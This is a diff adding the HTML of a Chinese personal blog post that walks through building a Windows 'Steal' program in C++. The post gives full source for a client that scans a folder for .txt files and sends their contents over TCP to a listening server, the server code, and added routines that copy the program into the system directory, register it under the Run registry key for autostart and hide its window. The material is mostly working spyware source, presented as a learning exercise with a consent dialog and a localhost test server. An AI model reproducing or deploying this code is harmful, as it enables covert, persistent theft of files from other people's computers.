@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+    <title>网络截取文件 | ohmyhsy</title>
+
+    <meta name="description" content="&lt;h1 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;socket的基础语法看过了，但是要说掌握那也是没掌握住~往下看用到再补。&lt;/p&gt;">
+    <meta name="keywords" content="8bytes-blog">
+
+    
+
+    <meta property="og:locale" content="cn" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content= "网络截取文件 | ohmyhsy"  />
+    <meta property="og:description" content= "&lt;h1 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;socket的基础语法看过了，但是要说掌握那也是没掌握住~往下看用到再补。&lt;/p&gt;" />
+    <meta property="og:url" content="https://8bytes.top/2022/07/16/winFiles/index.html" />
+    <meta property="og:site_name" content="" />
+    <meta property="article:author" content="Box" />
+    <meta property="article:publisher" content="" />
+    <meta property="og:description" content="&lt;h1 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;socket的基础语法看过了，但是要说掌握那也是没掌握住~往下看用到再补。&lt;/p&gt;" />
+    <meta name="twitter:title" content="网络截取文件 | ohmyhsy"/>
+    <meta name="twitter:description" content="&lt;h1 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;socket的基础语法看过了，但是要说掌握那也是没掌握住~往下看用到再补。&lt;/p&gt;"/>
+    <script type="application/ld+json">
+        {
+            "description": "&lt;h1 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;socket的基础语法看过了，但是要说掌握那也是没掌握住~往下看用到再补。&lt;/p&gt;",
+            "author": { "@type": "Person", "name": "Box" },
+            "@type": "BlogPosting",
+            "url": "https://8bytes.top/2022/07/16/winFiles/index.html",
+            "publisher": {
+            "@type": "Organization",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://8bytes.topundefined"
+            },
+            "name": "Box"
+            },
+            "headline": "网络截取文件 | ohmyhsy",
+            "datePublished": "2022-07-16T08:17:09.000Z",
+            "mainEntityOfPage": {
+                "@type": "WebPage",
+                "@id": "https://8bytes.top/2022/07/16/winFiles/index.html"
+            },
+            "@context": "http://schema.org"
+        }
+    </script>
+
+
+
+
+    
+
+    
+    <meta property="algolia:search" data-application-id="4CVCYWPWWN" data-api-key="7757db6b0a31c3f94c301c885693ed0d" data-index-name="ohmyhsy">
+    
+
+    
+
+    
+
+    
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🎮</text></svg>">
+    
+
+    
+
+    
+
+    
+<link rel="stylesheet" href="/dist/build.css?v=1646451311888.css">
+
+
+    
+<link rel="stylesheet" href="/dist/custom.css?v=1646451311888.css">
+
+
+    <script>
+        window.isPost = true
+        window.aomori = {
+            
+            
+            
+        }
+        window.aomori_logo_typed_animated = true
+        window.aomori_search_algolia = true
+
+    </script>
+
+<meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="ohmyhsy" type="application/atom+xml">
+</head>
+
+<body>
+
+    <div class="container">
+    <header class="header">
+        <div class="header-type">
+            
+            <div class="header-type-inner">
+                
+                    <div id="typed-strings" style="display:none">
+                        <p>ohmyhsy</p>
+                    </div>
+                    <a class="header-type-title" id="typed" href="/"></a>
+                
+    
+                
+            </div>
+        </div>
+        <div class="header-menu">
+            <div class="header-menu-inner">
+                
+                <a href="/">Home</a>
+                
+                <a href="/archives">Archives</a>
+                
+                <a href="/friends">Friends</a>
+                
+                <a href="/collect">Collect</a>
+                
+                <a href="/photography">Phtotgraphy</a>
+                
+            </div>
+            <div class="header-menu-social">
+                
+    <a class="social" target="_blank" href="https://github.com/8bytes-code">
+        <box-icon type='logo' name='github'></box-icon>
+    </a>
+
+            </div>
+        </div>
+
+        <div class="header-menu-mobile">
+            <div class="header-menu-mobile-inner" id="mobile-menu-open">
+                <i class="icon icon-menu"></i>
+            </div>
+        </div>
+    </header>
+
+    <div class="header-menu-mobile-menu">
+        <div class="header-menu-mobile-menu-bg"></div>
+        <div class="header-menu-mobile-menu-wrap">
+            <div class="header-menu-mobile-menu-inner">
+                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
+                    <i class="icon icon-cross"></i>
+                </div>
+                <div class="header-menu-mobile-menu-list">
+                    
+                    <a href="/">Home</a>
+                    
+                    <a href="/archives">Archives</a>
+                    
+                    <a href="/friends">Friends</a>
+                    
+                    <a href="/collect">Collect</a>
+                    
+                    <a href="/photography">Phtotgraphy</a>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+    <div class="container">
+        <div class="main">
+            <section class="inner">
+                <section class="inner-main">
+                    <div class="post">
+    <article id="post-cl7vfxqv30079bw9c2vdxdckh" class="article article-type-post" itemscope
+    itemprop="blogPost">
+
+    <div class="article-inner">
+
+        
+          
+        
+        
+        
+
+        
+        <header class="article-header">
+            
+  
+    <h1 class="article-title" itemprop="name">
+      网络截取文件
+    </h1>
+  
+
+        </header>
+        
+
+        <div class="article-more-info article-more-info-post hairline">
+
+            <div class="article-date">
+  <time datetime="2022-07-16T08:17:09.000Z" itemprop="datePublished">2022-07-16</time>
+</div>
+
+            
+
+            
+            <div class="article-tag">
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/" rel="tag">windows</a></li></ul>
+            </div>
+            
+
+            
+            <div class="article-busuanzi">
+                <span id="busuanzi_value_page_pv">N</span> 人看过
+            </div>
+            
+
+        </div>
+
+        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>socket的基础语法看过了，但是要说掌握那也是没掌握住~往下看用到再补。</p>
+<span id="more"></span>
+
+
+<hr>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>当然基础的截取，肯定先知道ip地址，然后权限开放程度高点。</p>
+<pre><code class="cpp">int main()&#123;
+    printf(&quot;Steal start!\n&quot;);
+    DoSteal(&quot;E:\\mysdk\\&quot;);
+
+    return 0;
+&#125;
+</code></pre>
+<p><strong>“E:&#x2F;mysdk”，使用反斜杠的做法同样有效，似乎是起源于unix写法，linux也很好的传承了，比如&#x2F;etc&#x2F;hosts之类的，而双斜杠自然是为了转译，毕竟单斜杠就会转译后面的字符了，如果是中文那才是真的gg。</strong></p>
+<hr>
+<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>能够多次使用，就做一个函数，传递的自然是文件路径，就用字符串，为了保证不被修改，加上const修饰</p>
+<pre><code class="cpp">int DoSteal(const char *filePath)&#123;
+    //遍历文件
+    WIN32_FIND_DATA FindFileData;        //表示文件，记不住留印象下次翻文档
+    HANDLE hListFile;                    //文件以句柄表示
+
+    //首先找到第一个匹配的文件，借助windows api
+    char searFilePath[MAX_PATH];                //注：MAX_PATH是一个宏，值为260
+&#125;
+</code></pre>
+<img src="/2022/07/16/winFiles/000.png" class="">
+<p>善用工具和文档，可以节省一些问题。</p>
+<pre><code class="cpp">int DoSteal(const char *filePath)&#123;
+    //遍历文件
+    WIN32_FIND_DATA FindFileData;        //表示文件，记不住留印象下次翻文档
+    HANDLE hListFile;                    //文件以句柄表示
+
+    //首先找到第一个匹配的文件，借助windows api
+    char searFilePath[MAX_PATH] = &#123;0&#125;;                //注：MAX_PATH是一个宏，值为260
+    strcpy(searFilePath, filePath);                    //先将传入的文件路径拷贝下来
+    strcat(searFilePath, &quot;\\*&quot;);                    //再加上一个通配符，*代表全部
+    FindFirstFile((LPCTSTR)searFilePath, &amp;FindFileData);
+&#125;
+</code></pre>
+<p>searFilePath毕竟是char类型，要么强转，要么修改项目字符类型为多字节吧。</p>
+<p>然后这边编译器其实会对strcpy和strcat报错，原因在于vs认为这俩函数不安全，建议你用_s的函数，但是这里不考虑这么搞，就强制取消对这个</p>
+<img src="/2022/07/16/winFiles/001.png" class="">
+<p>4996问题报错，把它关了。</p>
+<img src="/2022/07/16/winFiles/002.png" class="">
+<p>然后在编译就没啥问题了。</p>
+<p>额，这边后面有报错字符类型转换问题，那干脆还是修改项目字符类型为多字节吧。</p>
+<pre><code class="cpp">int DoSteal(const char *filePath)&#123;
+    //遍历文件
+    WIN32_FIND_DATA FindFileData;        //表示文件，记不住留印象下次翻文档
+    HANDLE hListFile;                    //文件以句柄表示
+
+    //首先找到第一个匹配的文件，借助windows api
+    char searFilePath[MAX_PATH] = &#123;0&#125;;                //注：MAX_PATH是一个宏，值为260
+    strcpy(searFilePath, filePath);                    //先将传入的文件路径拷贝下来
+    strcat(searFilePath, &quot;\\*&quot;);                    //再加上一个通配符，*代表全部
+    hListFile = FindFirstFile(searFilePath, &amp;FindFileData);
+
+    //循环遍历，毕竟是通配符*
+    do &#123;
+        char mypath[MAX_PATH] = &#123; 0 &#125;;
+        strcpy(mypath, filePath);                        //copy路径
+        strcat(mypath, FindFileData.cFileName);            //将其文件名拼接到路径后面
+        printf(&quot;mypath = %s\n&quot;,mypath);
+    &#125; while (FindNextFile(hListFile,&amp;FindFileData));                        //FindNextFile返回值NULL则表示结束
+
+    return 0;
+&#125;
+</code></pre>
+<p>然后跑一遍</p>
+<img src="/2022/07/16/winFiles/003.png" class="">
+<p>看到结果是正常的。</p>
+<p>路径显示正常了，就需要读出单个文件</p>
+<pre><code class="cpp">int DoSteal(const char *filePath)&#123;
+    //遍历文件
+    WIN32_FIND_DATA FindFileData;        //表示文件，记不住留印象下次翻文档
+    HANDLE hListFile;                    //文件以句柄表示
+
+    //首先找到第一个匹配的文件，借助windows api
+    char searFilePath[MAX_PATH] = &#123;0&#125;;                //注：MAX_PATH是一个宏，值为260
+    strcpy(searFilePath, filePath);                    //先将传入的文件路径拷贝下来
+    strcat(searFilePath, &quot;\\*&quot;);                    //再加上一个通配符，*代表全部
+    hListFile = FindFirstFile(searFilePath, &amp;FindFileData);
+
+    //循环遍历，毕竟是通配符*
+    do &#123;
+        char mypath[MAX_PATH] = &#123; 0 &#125;;
+        strcpy(mypath, filePath);                        //copy路径
+        strcat(mypath, FindFileData.cFileName);            //将其文件名拼接到路径后面
+        
+        if (strstr(mypath, &quot;.txt&quot;))&#123;
+            SendtoServer(mypath);
+            printf(&quot;mypath = %s\n&quot;, mypath);
+        &#125;
+        
+        
+    &#125; while (FindNextFile(hListFile,&amp;FindFileData));                        //FindNextFile返回值NULL则表示结束
+
+    return 0;
+&#125;
+</code></pre>
+<p>调用自定义函数，估计也要通过c&#x2F;s模式</p>
+<pre><code class="cpp">int SendtoServer(const char *_mypath)&#123;
+    //*初始化网络库
+    WORD wVersionRequested;
+    WSADATA wsaData;
+    int err;
+
+    wVersionRequested = MAKEWORD(2, 2);
+    err = WSAStartup(wVersionRequested, &amp;wsaData);
+    if (err != 0)&#123;
+        printf(&quot;WSAStartup errorNum = %d\n&quot;, GetLastError());
+        return err;
+    &#125;
+    if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)&#123;
+        printf(&quot;LOBYTE errorNum = %d\n&quot;, GetLastError());
+        WSACleanup();
+        return -1;
+    &#125;
+
+    //构造socket对象
+    SOCKET sockCli = socket(AF_INET, SOCK_STREAM, 0);
+    if (INVALID_SOCKET == sockCli)&#123;
+        printf(&quot;socket errorNum = %d\n&quot;, GetLastError());
+        return -1;
+    &#125;
+
+    //配置要连接的服务器
+    SOCKADDR_IN addrSer;
+    addrSer.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);    //本机ip地址测试
+    addrSer.sin_family = AF_INET;                                //ipv4
+    addrSer.sin_port = htons(6000);                        //端口号
+
+
+    //连接服务器
+    if (SOCKET_ERROR == connect(sockCli, (SOCKADDR *)&amp;addrSer, sizeof(SOCKADDR)))&#123;
+        printf(&quot;connect errorNum = %d\n&quot;, GetLastError());
+        return -1;
+    &#125;
+
+
+    //读取文件内容
+    char sendBuf[1024] = &#123; 0 &#125;;                        //尽量调合适大小，避免缓冲区溢出
+    FILE *fp = fopen(_mypath, &quot;rb&quot;);
+    int len = fread(sendBuf, 1, 1024, fp);
+    fclose(fp);
+
+
+    //发送数据
+    int iLen = send(sockCli, (char *)sendBuf, 100, 0);
+    if (iLen &lt; 0)&#123;
+        printf(&quot;send erroNum = %d\n&quot;, GetLastError());
+        return -1;
+    &#125;
+
+
+    //关闭套接字
+    closesocket(sockCli);
+    WSACleanup();
+    return 0;
+&#125;
+</code></pre>
+<p>与之前tcp客户端不同的是此处不需要接受数据，因为传递是通过形参的。</p>
+<hr>
+<p>完整的：</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#pragma comment(lib,&quot;ws2_32.lib&quot;)
+
+
+int SendtoServer(const char *_mypath)&#123;
+    //*初始化网络库
+    WORD wVersionRequested;
+    WSADATA wsaData;
+    int err;
+
+    wVersionRequested = MAKEWORD(2, 2);
+    err = WSAStartup(wVersionRequested, &amp;wsaData);
+    if (err != 0)&#123;
+        printf(&quot;WSAStartup errorNum = %d\n&quot;, GetLastError());
+        return err;
+    &#125;
+    if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)&#123;
+        printf(&quot;LOBYTE errorNum = %d\n&quot;, GetLastError());
+        WSACleanup();
+        return -1;
+    &#125;
+
+    //构造socket对象
+    SOCKET sockCli = socket(AF_INET, SOCK_STREAM, 0);
+    if (INVALID_SOCKET == sockCli)&#123;
+        printf(&quot;socket errorNum = %d\n&quot;, GetLastError());
+        return -1;
+    &#125;
+
+    //配置要连接的服务器
+    SOCKADDR_IN addrSer;
+    addrSer.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);    //本机ip地址测试
+    addrSer.sin_family = AF_INET;                                //ipv4
+    addrSer.sin_port = htons(6000);                        //端口号
+
+
+    //连接服务器
+    if (SOCKET_ERROR == connect(sockCli, (SOCKADDR *)&amp;addrSer, sizeof(SOCKADDR)))&#123;
+        printf(&quot;connect errorNum = %d\n&quot;, GetLastError());
+        return -1;
+    &#125;
+
+    //收发数据，对比服务器，客户端应是先收后发
+    //char recvBuf[100] = &#123; 0 &#125;;
+    //int iLen = recv(sockCli, recvBuf, 100, 0);
+    //printf(&quot;recvBuf = %s\n&quot;, recvBuf);
+
+    //读取文件内容
+    char sendBuf[1024] = &#123; 0 &#125;;                        //尽量调合适大小，避免缓冲区溢出
+    FILE *fp = fopen(_mypath, &quot;rb&quot;);
+    int len = fread(sendBuf, 1, 1024, fp);
+    fclose(fp);
+
+
+    //发送数据
+    int iLen = send(sockCli, (char *)sendBuf, 100, 0);
+    if (iLen &lt; 0)&#123;
+        printf(&quot;send erroNum = %d\n&quot;, GetLastError());
+        return -1;
+    &#125;
+
+
+    //关闭套接字
+    closesocket(sockCli);
+    WSACleanup();
+    return 0;
+&#125;
+
+int DoSteal(const char *filePath)&#123;
+    //遍历文件
+    WIN32_FIND_DATA FindFileData;        //表示文件，记不住留印象下次翻文档
+    HANDLE hListFile;                    //文件以句柄表示
+
+    //首先找到第一个匹配的文件，借助windows api
+    char searFilePath[MAX_PATH] = &#123;0&#125;;                //注：MAX_PATH是一个宏，值为260
+    strcpy(searFilePath, filePath);                    //先将传入的文件路径拷贝下来
+    strcat(searFilePath, &quot;\\*&quot;);                    //再加上一个通配符，*代表全部
+    hListFile = FindFirstFile(searFilePath, &amp;FindFileData);
+
+    //循环遍历，毕竟是通配符*
+    do &#123;
+        char mypath[MAX_PATH] = &#123; 0 &#125;;
+        strcpy(mypath, filePath);                        //copy路径
+        strcat(mypath, FindFileData.cFileName);            //将其文件名拼接到路径后面
+        
+        if (strstr(mypath, &quot;.txt&quot;))&#123;
+            SendtoServer(mypath);
+            printf(&quot;mypath = %s\n&quot;, mypath);
+        &#125;
+        
+        
+    &#125; while (FindNextFile(hListFile,&amp;FindFileData));                        //FindNextFile返回值NULL则表示结束
+
+    return 0;
+&#125;
+
+
+int main()&#123;
+    printf(&quot;Steal start!\n&quot;);
+    DoSteal(&quot;E:/mysdk/&quot;);
+
+    return 0;
+&#125;
+</code></pre>
+<hr>
+<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;WinSock2.h&gt;
+#pragma comment(lib,&quot;ws2_32.lib&quot;)
+#define MAX_SIZE 1024
+
+//console error tips
+void ErrorHanding(const char *_msg)&#123;
+    fputs(_msg, stderr);
+    fputc(&#39;\n&#39;, stderr);
+    exit(1);
+&#125;
+
+int main()&#123;
+    //初始化网络库
+    WORD wVersionRequested;
+    WSADATA wsaData;
+    int err;
+    char msg[MAX_SIZE] = &#123; 0 &#125;;
+
+    wVersionRequested = MAKEWORD(2, 2);
+    err = WSAStartup(wVersionRequested, &amp;wsaData);
+    if (err != 0)&#123;
+        ErrorHanding(&quot;WSAtartup error!&quot;);
+    &#125;
+    if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)&#123;
+        ErrorHanding(&quot;LOBYTE error!&quot;);
+        WSACleanup();
+        return -1;
+    &#125;
+
+    //构造socket
+    SOCKET sockSer = socket(PF_INET, SOCK_STREAM, 0);
+    if (INVALID_SOCKET == sockSer)&#123;
+        ErrorHanding(&quot;socket error!&quot;);
+    &#125;
+
+    //填充参数
+    SOCKADDR_IN addrSer;
+    addrSer.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
+    addrSer.sin_family = AF_INET;                        //ipv4
+    addrSer.sin_port = htons(6000);                        //端口号
+
+    //绑定
+    if (SOCKET_ERROR == bind(sockSer, (SOCKADDR *)&amp;addrSer, sizeof(SOCKADDR)))&#123;
+        ErrorHanding(&quot;bind error&quot;);
+    &#125;
+
+    //监听
+    if (SOCKET_ERROR == listen(sockSer, 5))&#123;
+        ErrorHanding(&quot;listen error&quot;);
+    &#125;
+
+    //循环接收
+    SOCKADDR_IN addCli;
+    int cliSize = sizeof(SOCKADDR_IN);
+    SOCKET cliSock;
+    int strLen = 0;
+
+    while (true)&#123;
+        cliSock = accept(sockSer, (SOCKADDR *)&amp;addCli, &amp;cliSize);
+        if (INVALID_SOCKET == cliSock)&#123;
+            ErrorHanding(&quot;accept error!&quot;);
+        &#125;
+
+        memset(msg, 0, MAX_SIZE);
+
+        while ((strLen = recv(cliSock,msg,MAX_SIZE,0)) != 0)&#123;
+            printf(&quot;server msg:%s\n&quot;, msg);
+        &#125;
+        closesocket(cliSock);
+    &#125;
+    
+    //over closesocket
+    closesocket(sockSer);
+    WSACleanup();
+
+    return 0;
+&#125;
+</code></pre>
+<p>也是稍微做了一些优化</p>
+<pre><code class="cpp">//console error tips
+void ErrorHanding(const char *_msg)&#123;
+    fputs(_msg, stderr);
+    fputc(&#39;\n&#39;, stderr);
+    exit(1);
+&#125;
+</code></pre>
+<p>像这种处理错误的时候，每次提示错误，return -1也麻烦，干脆封装到函数里。</p>
+<hr>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>先调整一下客户端，做一个持续延时发送</p>
+<pre><code class="cpp">int main()&#123;
+    printf(&quot;Steal start!\n&quot;);
+
+    while (true)&#123;
+        DoSteal(&quot;E:/mysdk/&quot;);
+        Sleep(5000);
+    &#125;
+    
+    return 0;
+&#125;
+</code></pre>
+<p>然后先跑到debug文件夹启动服务器<br>在vs中跑客户端程序</p>
+<img src="/2022/07/16/winFiles/004.png" class="">
+<p>可以看到持续发送之后，因为文件夹里面就放了一个.txt文件，所以一直都是读取这个文件。</p>
+<p>然后可以多创几个txt试试</p>
+<img src="/2022/07/16/winFiles/005.png" class="">
+<p>现在一共三个.txt文件，然后在循环跑出其中的内容。</p>
+<img src="/2022/07/16/winFiles/006.png" class="">
+<p>中文乱码跟文件编码有关系，txt默认可能是utf-8，然后vs的项目我也忘看改成啥了多字节还是Unicode，倒不是啥大问题，通信正常就行。</p>
+<p>算了还是改一下吧，将项目修改成多字节，然后文件另存为的时候可以修改编码，或者你有notepad的话可以直接改，记事本好像只能另存为的时候改。</p>
+<img src="/2022/07/16/winFiles/007.png" class="">
+<p>改完之后再跑一次</p>
+<img src="/2022/07/16/winFiles/008.png" class="">
+<p>可以看到没问题，中文显示正常。</p>
+<p>printf可能会有缓冲的问题，可能表现在打印很多次之后会卡住一会。<br>那么则可能要用puts之类直接打印字符串的。虽然都差不多。目前是不关注了。</p>
+<blockquote>
+<p>1、不同的换行符<br>puts（）函数会自动在字符串末尾添加一个换行符，这意味着它会自动换行，而printf（）函数没有此功能。<br>2、输出内容不同<br>puts（）函数只能输出字符串，不能对输出和转换指令进行标准化，而printf（）函数可以。</p>
+</blockquote>
+<hr>
+<h2 id="隐藏和自启动"><a href="#隐藏和自启动" class="headerlink" title="隐藏和自启动"></a>隐藏和自启动</h2><pre><code class="cpp">void AddToSystem()&#123;
+    HKEY hkey;                            //key
+    char currenPath[MAX_PATH] = &#123; 0 &#125;;    //路径
+    char systemPath[MAX_PATH] = &#123; 0 &#125;;    //系统路径
+    long ret = 0;
+    LPSTR FileNewName;
+    LPSTR FileCurrentName;
+    DWORD type = REG_SZ;
+    DWORD size = MAX_PATH;
+    LPCTSTR Rgspath = &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;;    //注册表自启动目录
+
+    GetSystemDirectory(systemPath, size);
+    GetModuleFileName(NULL, currenPath, size);
+
+    //copy file
+    FileCurrentName = currenPath;
+    FileNewName = lstrcat(systemPath, &quot;\\Steal.exe&quot;);            //写入注册表这个程序的名称
+    struct _finddata_t Steal;
+    printf(&quot;ret1 = %d\n&quot;, ret);
+    if (_findfirst(FileNewName, &amp;Steal) != -1)
+        return;    //已安装
+    printf(&quot;ret2 = %d\n&quot;, ret);
+
+    int ihow = MessageBox(0, 
+                &quot;该程序只允许用于合法的用途！\n 继续运行该程序将使得这台电脑处于被监控状态,\n 如果您不想这样，请点击\&#39;取消\&#39;按钮推出。\n 按下\&#39;是\&#39;则该程序将被复制到您的机器上 \
+                \ 并随着系统启动自动运行。\n 按下\&#39;否\&#39;则程序只运行一次，不会再您的系统内留下任何东西。&quot;, &quot;警告&quot;, MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);
+
+    if (ihow == IDCANCEL)&#123;
+        exit(0);
+    &#125;
+
+    if (ihow == IDNO)&#123;
+        return;            //则只运行一次
+    &#125;
+
+    //复制文件
+    ret = CopyFile(FileCurrentName, FileNewName, TRUE);
+    if (!ret)&#123;
+        return;
+    &#125;
+
+    //加入注册表        需要管理员打开，不然没权限无法写入
+    printf(&quot;ret = %d\n&quot;, ret);
+    ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, Rgspath, 0, KEY_WRITE, &amp;hkey);
+    if (ret != ERROR_SUCCESS)&#123;
+        RegCloseKey(hkey);
+        return;
+    &#125;
+
+    //Set Key
+    ret = RegSetValueEx(hkey, &quot;Steal&quot;, NULL, type, (const unsigned char *)FileNewName, size);
+    if (ret != ERROR_SUCCESS)&#123;
+        RegCloseKey(hkey);
+        return;
+    &#125;
+
+    //最终仍需手动关闭
+    RegCloseKey(hkey);
+&#125;
+</code></pre>
+<p>这个写进注册表的真的是又臭又长。。。说白了还是不会用直接抄。</p>
+<img src="/2022/07/16/winFiles/009.png" class="">
+<p>编译后记住要管理员启动才能到那一步，不然权限不够。</p>
+<pre><code class="cpp">void HideMyself()&#123;
+    //首先拿到当前窗口的句柄
+    HWND hwnd = GetForegroundWindow();
+    ShowWindow(hwnd, SW_HIDE);
+&#125;
+</code></pre>
+<p>隐藏就比较直接，通过获取当前窗口句柄，直接调用现成的隐藏掉。</p>
+<img src="/2022/07/16/winFiles/010.png" class="">
+<p>可以看到先开服务器之后，客户端启用直接闪烁就隐藏了，连接的消息还是在持续发送的一个状态。</p>
+<hr>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><ol>
+<li>文件遍历，能够第一时间想起<code>WIN32_FIND_DATA</code>结构体</li>
+<li><code>WIN32_FIND_DATA</code>包含了文件名和文件信息，创建时间，访问时间等</li>
+<li>句柄——指针 用来表示windows下的一些对象</li>
+<li>MAX_PATH 预定义的宏，260</li>
+<li>禁用特定警告，比如没有使用_s的安全函数</li>
+<li>隐藏窗口其实挺好记的，注册表这个要多用或者查查文档，感觉也没必要死记硬背</li>
+</ol>
+
+        </div>
+
+    </div>
+
+    
+
+    
+
+    
+
+    
+  <div class="article-copyright hairline">
+    <p>
+      本作品采用  <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议 (CC BY-NC-ND 4.0)</a> 进行许可。
+    </p>
+  </div>
+  
+
+    
+
+    
+<nav class="article-nav">
+  
+    <a href="/2022/07/16/text013/" id="article-nav-newer" class="article-nav-link-wrap">
+      <div class="article-nav-caption">下一篇</div>
+      <div class="article-nav-title">
+        
+          text013
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/14/text012/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-caption">上一篇</div>
+      <div class="article-nav-title">代码风格</div>
+    </a>
+  
+</nav>
+
+
+    <section class="share">
+        <div class="share-title">分享</div>
+        <a class="share-item" target="_blank"
+            href="https://twitter.com/share?text=网络截取文件 - ohmyhsy&url=https%3A%2F%2F8bytes.top%2F2022%2F07%2F16%2FwinFiles%2F">
+            <box-icon type='logo' name='twitter'></box-icon>
+        </a>
+        <a class="share-item" target="_blank"
+            href="https://www.facebook.com/sharer.php?title=网络截取文件 - ohmyhsy&u=https%3A%2F%2F8bytes.top%2F2022%2F07%2F16%2FwinFiles%2F">
+            <box-icon name='facebook-square' type='logo' ></box-icon>
+        </a>
+        <!-- <a class="share-item" target="_blank"
+            href="https://service.weibo.com/share/share.php?title=网络截取文件 - ohmyhsy&url=https://8bytes.top/2022/07/16/winFiles/&pic=">
+            <div class="n-icon n-icon-weibo"></div>
+        </a> -->
+    </section>
+
+</article>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- <script src="//unpkg.com/@waline/dist/Waline.min.js"></script> -->
+    <script src="https://unpkg.com/@waline/client@v2/dist/waline.js"></script>
+    <link
+        rel="stylesheet"
+        href="https://unpkg.com/@waline/client@v2/dist/waline.css"
+    />
+    <section class="comments">
+        <div id="waline"></div>
+    </section>
+    <script>
+        Waline.init({
+          el: '#waline',
+          serverURL: 'https://ohmyhsy.vercel.app/',
+        });
+    </script>
+
+
+
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+</div>
+
+                </section>
+            </section>
+
+            
+            <aside class="sidebar sidebar-search-fix">
+                
+
+    <div class="search">
+    <div class="has-icon-right">
+        <input type="text" class="form-input" id="search" placeholder="SEARCH" autocomplete="off">
+        <div class="form-icon">
+            <box-icon name='search' color="#3c4859"></box-icon>
+        </div>
+    </div>
+    <div class="search-result" id="search-ps"></div>
+</div>
+
+
+<div class="widget" id="widget">
+    
+      
+  <div class="widget-wrap">
+    <div class="widget-inner">
+      <div class="toc post-toc-html"></div>
+    </div>
+  </div>
+
+    
+      
+
+    
+      
+  <div class="widget-wrap widget-tags">
+    <div class="widget-title"><span>Tags</span></div>
+    <div class="widget-inner">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/MFC/" rel="tag">MFC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Markdown/" rel="tag">Markdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NoteBook/" rel="tag">NoteBook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RemoteControl/" rel="tag">RemoteControl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cheat-engine/" rel="tag">cheat engine</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/compiler/" rel="tag">compiler</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cpp/" rel="tag">cpp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exam/" rel="tag">exam</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/" rel="tag">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jetbrains/" rel="tag">jetbrains</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcode/" rel="tag">leetcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phone/" rel="tag">phone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/visual-studio-2022/" rel="tag">visual studio 2022</a></li><li class="tag-list-item"><a class="tag-list-link" 